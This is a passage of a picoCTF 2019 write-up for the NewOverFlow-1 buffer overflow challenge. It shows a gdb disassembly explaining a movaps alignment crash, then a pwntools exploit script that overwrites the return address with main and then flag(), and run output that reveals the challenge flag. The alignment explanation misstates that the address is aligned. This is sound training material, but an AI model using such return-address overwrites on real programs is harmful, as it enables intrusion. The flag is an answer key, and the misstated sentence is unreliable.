```
(gdb) set disassembly-flavor intel
(gdb) disas
Dump of assembler code for function buffered_vfprintf:
   0x00007f73765695d0 :     push   r14
   0x00007f73765695d2 :     push   r13
   0x00007f73765695d4 :     push   r12
   0x00007f73765695d6 :     push   rbp
   0x00007f73765695d7 :     push   rbx
   0x00007f73765695d8 :     mov    rbx,rdi
   0x00007f73765695db :    sub    rsp,0x2140
   0x00007f73765695e2 :    mov    rax,QWORD PTR fs:0x28
   0x00007f73765695eb :    mov    QWORD PTR [rsp+0x2138],rax
   0x00007f73765695f3 :    xor    eax,eax
   0x00007f73765695f5 :    mov    eax,DWORD PTR [rdi+0xc0]
   0x00007f73765695fb :    test   eax,eax
   0x00007f73765695fd :    jne    0x7f7376569770 
   0x00007f7376569603 :    mov    DWORD PTR [rdi+0xc0],0xffffffff
   0x00007f737656960d :    lea    rax,[rsp+0x130]
   0x00007f7376569615 :    lea    rdi,[rsp+0x30]
   0x00007f737656961a :    mov    QWORD PTR [rsp+0x110],rbx
   0x00007f7376569622 :    mov    DWORD PTR [rsp+0xf0],0xffffffff
   0x00007f737656962d :    mov    DWORD PTR [rsp+0x30],0xfbad8004
   0x00007f7376569635 :   mov    QWORD PTR [rsp+0x8],rax
   0x00007f737656963a :   lea    rax,[rsp+0x2130]
   0x00007f7376569642 :   mov    QWORD PTR [rsp+0xb8],0x0
   0x00007f737656964e :   movq   xmm0,QWORD PTR [rsp+0x8]
   0x00007f7376569654 :   mov    QWORD PTR [rsp+0x60],rax
   0x00007f7376569659 :   mov    eax,DWORD PTR [rbx+0x74]
   0x00007f737656965c :   punpcklqdq xmm0,xmm0
   0x00007f7376569660 :   mov    DWORD PTR [rsp+0xa4],eax
   0x00007f7376569667 :   lea    rax,[rip+0x3890f2]        # 0x7f73768f2760 
=> 0x00007f737656966e :   movaps XMMWORD PTR [rsp+0x50],xmm0
   0x00007f7376569673 :   mov    QWORD PTR [rsp+0x108],rax
   0x00007f737656967b :   call   0x7f7376566390 
   0x00007f7376569680 :   mov    r12d,eax
   0x00007f7376569683 :   mov    r13d,DWORD PTR [rip+0x39225e]        # 0x7f73768fb8e8 
```
Let's take a look at the [`movaps` Reference](https://c9x.me/x86/html/file_module_x86_id_180.html):
> When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) is generated.
However, in our case:
```
(gdb) p $rsp+0x50
$1 = (void *) 0x7fff815c94a8
(gdb) p ((unsigned int)$1) % 16
$3 = 8
```
This value is 16-byte aligned, so the program crashes. Looks like a compiler optimization is standing between us and the flag.
The solution was to call `main` again via the original payload, and then call `flag` as intended. Lucky for us, the stack was correctly aligned for such a call stack.
A `pwntools` script to automate the process:
```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
import os
if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))
def send_payload(proc, payload):
    proc.sendlineafter("Welcome to 64-bit. Give me a string that gets you the flag: ", payload)
def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(200, n = exe.bytes)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {} ({}-byte architecture)".format(offset, exe.bytes))
    return offset
overflow_offset = get_overflow_offset()
log.info("flag() address: {}".format(hex(exe.symbols["flag"])))
io = start()
payload = fit({overflow_offset: exe.symbols["main"]}, filler = 'B')
log.info("Sending payload: \n{}".format(hexdump(payload)))
send_payload(io, payload)
payload = fit({overflow_offset: exe.symbols["flag"]}, filler = 'B')
log.info("Sending payload: \n{}".format(hexdump(payload)))
send_payload(io, payload)
print io.recvall()
```
Output:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# python exploit.py
[*] '/media/sf_CTFs/pico/NewOverFlow-1/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] PI:EMAIL:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.6L3X1OVx47'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a'
[+] Starting local process '/media/sf_CTFs/pico/NewOverFlow-1/vuln': pid 840
[*] Process '/media/sf_CTFs/pico/NewOverFlow-1/vuln' stopped with exit code -11 (SIGSEGV) (pid 840)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/NewOverFlow-1/core.840'
    Arch:      amd64-64-little
    RIP:       0x4007e7
    RSP:       0x7ffcf64ed5f8
    Exe:       '/media/sf_CTFs/pico/NewOverFlow-1/vuln' (0x400000)
    Fault:     0x616161616161616a
[*] Overflow offset: 72 (8-byte architecture)
[*] flag() address: 0x400767
[+] Starting remote process '/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln' on 2019shell1.picoctf.com: pid 322295
[*] Sending payload:
    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    *
    00000040  42 42 42 42  42 42 42 42  e8 07 40 00  00 00 00 00  │BBBB│BBBB│··@·│····│
    00000050
[*] Sending payload:
    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    *
    00000040  42 42 42 42  42 42 42 42  67 07 40 00  00 00 00 00  │BBBB│BBBB│g·@·│····│
    00000050
[+] Receiving all data: Done (51B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 322295)
picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_d0b837aa}
```